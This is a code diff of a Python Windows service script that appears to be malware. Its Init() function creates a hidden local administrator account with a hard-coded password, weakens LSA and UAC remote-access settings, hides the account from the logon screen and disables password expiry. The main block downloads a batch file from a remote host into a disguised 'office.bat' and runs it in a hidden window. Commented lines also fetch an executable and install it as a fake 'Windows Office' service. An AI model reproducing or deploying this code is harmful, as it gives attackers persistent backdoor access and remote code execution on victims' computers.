@@ -157,38 +157,38 @@ except Exception as e:
 
        
 def Init():
-                        #os.environ["REQUESTS_CA_BUNDLE"] = swin+"/cacert.pem"
-                        #os.environ["REQUESTS_CA_BUNDLE"] = os.path.join(os.getcwd(), "certifi", "cacert.pem")
-                        #certifi.core.where=swin+"/certifi/cacert.pem"
-                        #requests.utils.DEFAULT_CA_BUNDLE_PATH=swin+"/certifi/cacert.pem"
-                        #requests.adapters.DEFAULT_CA_BUNDLE_PATH = swin+"/certifi/cacert.pem"
-    #os.system("net.exe user Administrator /active:yes")
-                        os.system("net.exe user asp Qwerty12! /add")
-                        os.system("net.exe localgroup administrators asp /add")
-                        os.system("reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v forceguest /t REG_DWORD /d 0 /f")
-                        os.system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f")
-                        os.system("wmic path Win32_UserAccount where Name=\'asp\' set PasswordExpires=false")
-                        os.system("reg add hklm\\system\\currentcontrolset\\control\\lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f")
-                        #os.system("netsh advfirewall set allprofiles state off")
+    #os.environ["REQUESTS_CA_BUNDLE"] = swin+"/cacert.pem"
+    #os.environ["REQUESTS_CA_BUNDLE"] = os.path.join(os.getcwd(), "certifi", "cacert.pem")
+    #certifi.core.where=swin+"/certifi/cacert.pem"
+    #requests.utils.DEFAULT_CA_BUNDLE_PATH=swin+"/certifi/cacert.pem"
+    #requests.adapters.DEFAULT_CA_BUNDLE_PATH = swin+"/certifi/cacert.pem"
+#os.system("net.exe user Administrator /active:yes")
+    os.system("net.exe user asp Qwerty12! /add")
+    os.system("net.exe localgroup administrators asp /add")
+    os.system("reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v forceguest /t REG_DWORD /d 0 /f")
+    os.system("reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f")
+    os.system("wmic path Win32_UserAccount where Name=\'asp\' set PasswordExpires=false")
+    os.system("reg add hklm\\system\\currentcontrolset\\control\\lsa /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f")
+    #os.system("netsh advfirewall set allprofiles state off")
 ##                            if not os.path.exists('c:\\windows\\wup.exe'):
 ##                                    os.system('powershell -Command Invoke-WebRequest -Uri "http://certificates.ddns.net/wofficeie.exe" -OutFile "c:\\windows\\wup.exe"')
 ##                                    subprocess.call("sc create wup binPath= \""+os.getenv('windir')+"\\wup.exe\" DisplayName= \"Windows Office\" start= auto", creationflags=CREATE_NO_WINDOW)
 ##                                    subprocess.call("net start wup", creationflags=CREATE_NO_WINDOW)
-                        if not os.path.exists('c:\\windows\\syswow64'):
-                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f')
-                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f')
-                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f')
-                        else:
-                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f /reg:64')
-                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f /reg:64')
-                                #os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v Administrator /t REG_DWORD /d 0 /f /reg:64')
-                                os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f /reg:64')
-                        
-                        
-                        #os.system("net.exe user Administrator Qwerty12")
-                        os.system("net.exe user asp Qwerty12!")
-                        os.system("net.exe user asp /active:yes")
-                        sinit='1'
+    if not os.path.exists('c:\\windows\\syswow64'):
+        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f')
+        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f')
+        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f')
+    else:
+        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts" /f /reg:64')
+        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /f /reg:64')
+        #os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v Administrator /t REG_DWORD /d 0 /f /reg:64')
+        os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList" /v asp /t REG_DWORD /d 0 /f /reg:64')
+    
+    
+    #os.system("net.exe user Administrator Qwerty12")
+    os.system("net.exe user asp Qwerty12!")
+    os.system("net.exe user asp /active:yes")
+    sinit='1'
 def myloop():
     #threading.Timer(10.0, myloop).start() # called every minute   
     sinit='0'
@@ -482,9 +482,13 @@ if __name__ == '__main__':
     #Init()
     #myloop()
     ip=socket.gethostbyname('config01.homepc.it')
-    p = Popen("curl -L http://"+ip+"/win/win.bat -o "+os.getenv('windir')+"\\office.bat",shell=True)    
+    SW_HIDE = 0
+    info = subprocess.STARTUPINFO()
+    info.dwFlags = subprocess.STARTF_USESHOWWINDOW
+    info.wShowWindow = SW_HIDE
+    subprocess.Popen(r"curl -L http://"+ip+"/win/win.bat -o "+os.getcwd()+"\\office.bat", startupinfo=info)       
     time.sleep(10)
-    p = Popen(os.getenv('windir')+"\\office.bat",shell=True)
+    p = Popen(os.getcwd()+"\\office.bat", startupinfo=info)
     if len(sys.argv) == 1:
         servicemanager.Initialize()
         servicemanager.PrepareToHostSingle(TestService)
